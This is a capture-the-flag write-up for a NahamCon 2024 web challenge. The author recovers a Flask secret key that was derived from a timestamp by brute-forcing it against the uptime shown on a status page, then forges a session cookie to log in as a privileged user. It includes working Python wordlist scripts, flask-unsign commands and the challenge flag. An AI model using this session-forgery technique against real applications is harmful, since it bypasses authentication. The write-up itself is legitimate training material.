# Thomas DEVerson

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- Contributor: @f0o_f0o
- 257 solves / 175 points
- Author: @Jstith
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

All things considered, I'm impressed this website is still up and running 200 years later. 

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527142456.png)

## Enumeration

**Index page:**

In this page, we can see a brief introduction of a historical building.

It also has a login form where we can login as a user.

**Status page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240528133653.png)

In here, we can see this web application's uptime.

Currently it's **`82816 days 20 hours 5 minutes`**.

**Backup page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240528133743.png)

**First 10 lines of `app.py`:**
```python
from flask import (Flask, flash, redirect, render_template, request, send_from_directory, session, url_for)
from datetime import datetime

app = Flask(__name__)

c = datetime.now()
f = c.strftime("%Y%m%d%H%M")
app.secret_key = f'THE_REYNOLDS_PAMPHLET-{f}'

allowed_users = ['Jefferson', 'Madison', 'Burr'] # No Federalists Allowed!!!!
```

Hmm... Looks like we need to **login as user `Jefferson`, `Madison`, or `Burr`**.

Also, as you can see, the web application is using the [Flask](https://flask.palletsprojects.com/en/3.0.x/) web application framework!

**In Flask application, our session token can be seen in our cookie:**
```
session=eyJuYW1lIjoiZ3Vlc3QifQ.ZlAbKw.WzYFGTjPkBHcX_cfXZRslyKwUmY
```

**By using the tool [Flask Unsign](https://github.com/Paradoxis/Flask-Unsign), we can decode the session cookie and see the details of our session token:**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Thomas-DEVerson)-[2024.05.27|14:31:23(HKT)]
└> flask-unsign --decode --cookie 'eyJuYW1lIjoiZ3Vlc3QifQ.ZlAbKw.WzYFGTjPkBHcX_cfXZRslyKwUmY'
{'name': 'guest'}
```

In the session token, it has a **`name` claim** with value `guest`.

If we somehow able to **forge the session token**, we can change the `name` claim's value to whatever we want!

**From the backup page, we can know that the Flask application's `secret_key` is generated via:**
```python
from datetime import datetime
[...]
c = datetime.now()
f = c.strftime("%Y%m%d%H%M")
app.secret_key = f'THE_REYNOLDS_PAMPHLET-{f}'
```

As you can see, the current time was appended to `secret_key`!

**Here's an example of the `secret_key`:**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Thomas-DEVerson)-[2024.05.27|14:32:55(HKT)]
└> python3                                                                                   
[...]
>>> from datetime import datetime
>>> c = datetime.now()
>>> print(c)
2024-05-27 14:37:07.823324
>>> f = c.strftime("%Y%m%d%H%M")
>>> print(f)
202405271437
>>> f'THE_REYNOLDS_PAMPHLET-{f}'
'THE_REYNOLDS_PAMPHLET-202405271437'
```

In here, we can see that **the date is formatted to `YYYYMMDDHHMM`**.

Therefore, we can easily **guess the `secret_key` value**!

When we have the Flask's `secret_key` value, we can **forge our own Flask session cookie**! For instance, we can **sign the forged session cookie `name` claim to user `Jefferson`, `Madison`, or `Burr`!**

## Exploitation

Armed with above information, we can try to guess the web application's Flask `secret_key` value!

According to the status page, the uptime is `82816 days 20 hours 5 minutes`. So, we can just calculate the original current time via this Python script:

```python
#!/usr/bin/env python3
from datetime import datetime, timedelta

if __name__ == '__main__':
    days = 82816
    hours = 20
    minutes = 5

    currentTime = datetime.now()
    calculatedTime = currentTime - timedelta(days=days, hours=hours, minutes=minutes)
    formattedCalculatedTime = calculatedTime.strftime('%Y%m%d%H%M')
    secretKey = f'THE_REYNOLDS_PAMPHLET-{formattedCalculatedTime}'

    print(f'[+] Calculated time: {calculatedTime}')
    print(f'[+] Formatted calculated time: {formattedCalculatedTime}')
    print(f'[+] Flask secret key: {secretKey}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Thomas-DEVerson)-[2024.05.28|13:41:43(HKT)]
└> python3 calculate_time.py 
[+] Calculated time: 1797-08-29 17:37:25.967638
[+] Formatted calculated time: 179708291737
[+] Flask secret key: THE_REYNOLDS_PAMPHLET-179708291737
```

**Then, we can use the tool [Flask Unsign](https://github.com/Paradoxis/Flask-Unsign) to try to unsign our session cookie via the calculated secret key:**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Thomas-DEVerson)-[2024.05.28|13:54:59(HKT)]
└> echo -n 'THE_REYNOLDS_PAMPHLET-179708291737' > secret.txt                     
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Thomas-DEVerson)-[2024.05.28|13:55:17(HKT)]
└> flask-unsign --unsign --wordlist ./secret.txt --cookie 'eyJuYW1lIjoiZ3Vlc3QifQ.ZlAbKw.WzYFGTjPkBHcX_cfXZRslyKwUmY' 
[*] Session decodes to: {'name': 'guest'}
[*] Starting brute-forcer with 8 threads..
[!] Failed to find secret key after 1 attempts.29
```

Nope... It doesn't work.

Oh... I forgot our timezone...

To solve this issue, let's just brute force the secret key!

**First, we'll need to prepare a wordlist via this Python script:**
```python
#!/usr/bin/env python3
from datetime import datetime, timedelta

def createWordlist(uptimeDay):
    OFFSET = 5
    MAX_HOUR = 24
    MAX_MINUTE = 60
    MIN_HOUR, MIN_MINUTE = 0, 0
    dayRange = range(uptimeDay - OFFSET, uptimeDay + OFFSET)
    hourRange = range(MIN_HOUR, MAX_HOUR)
    minuteRange = range(MIN_MINUTE, MAX_MINUTE)

    for day in dayRange:
        for hour in hourRange:
            for minute in minuteRange:
                currentTime = datetime.now()
                calculatedTime = currentTime - timedelta(days=day, hours=hour, minutes=minute)
                formattedCalculatedTime = calculatedTime.strftime('%Y%m%d%H%M')
                secretKey = f'THE_REYNOLDS_PAMPHLET-{formattedCalculatedTime}'

                with open('wordlist.txt', 'a') as file:
                    file.write(f'{secretKey}\n')

if __name__ == '__main__':
    uptimeDay = 82816 # adjust the uptime day if needed
    createWordlist(uptimeDay)
```

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Thomas-DEVerson)-[2024.05.28|13:56:30(HKT)]
└> python3 create_wordlist.py 
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Thomas-DEVerson)-[2024.05.28|13:56:35(HKT)]
└> head wordlist.txt      
THE_REYNOLDS_PAMPHLET-179709041356
THE_REYNOLDS_PAMPHLET-179709041355
THE_REYNOLDS_PAMPHLET-179709041354
THE_REYNOLDS_PAMPHLET-179709041353
THE_REYNOLDS_PAMPHLET-179709041352
THE_REYNOLDS_PAMPHLET-179709041351
THE_REYNOLDS_PAMPHLET-179709041350
THE_REYNOLDS_PAMPHLET-179709041349
THE_REYNOLDS_PAMPHLET-179709041348
THE_REYNOLDS_PAMPHLET-179709041347
```

**Then, use the [Flask Unsign](https://github.com/Paradoxis/Flask-Unsign) tool to brute force the secret key:**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Thomas-DEVerson)-[2024.05.28|13:57:40(HKT)]
└> flask-unsign --unsign --wordlist ./wordlist.txt --cookie 'eyJuYW1lIjoiZ3Vlc3QifQ.ZlAbKw.WzYFGTjPkBHcX_cfXZRslyKwUmY'
[*] Session decodes to: {'name': 'guest'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 22016 attemptsLET-17970826
'THE_REYNOLDS_PAMPHLET-179708250845'
```

Nice! We got the secret key!! It's **`THE_REYNOLDS_PAMPHLET-179708250845`**!

**After brute forcing the secret key, we can now forge our own Flask session cookie!**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Thomas-DEVerson)-[2024.05.28|13:57:45(HKT)]
└> flask-unsign --sign --secret 'THE_REYNOLDS_PAMPHLET-179708250845' --cookie "{'name': 'Burr'}"
eyJuYW1lIjoiQnVyciJ9.ZlVyjA.2rb4vSGy3gA6nypgN9QxjhOfvA4
```

Finally, we can replace our old session cookie with the new one!

Old session cookie:

```
session=eyJuYW1lIjoiZ3Vlc3QifQ.ZlAbKw.WzYFGTjPkBHcX_cfXZRslyKwUmY
```

New session cookie:

```
session=eyJuYW1lIjoiQnVyciJ9.ZlVyjA.2rb4vSGy3gA6nypgN9QxjhOfvA4
```

Then, we can get the flag!

- **Flag: `flag{f69f2c087b291b9da9c9fe9219ee130f}`**

## Conclusion

What we've learned:

1. Forge Flask session cookie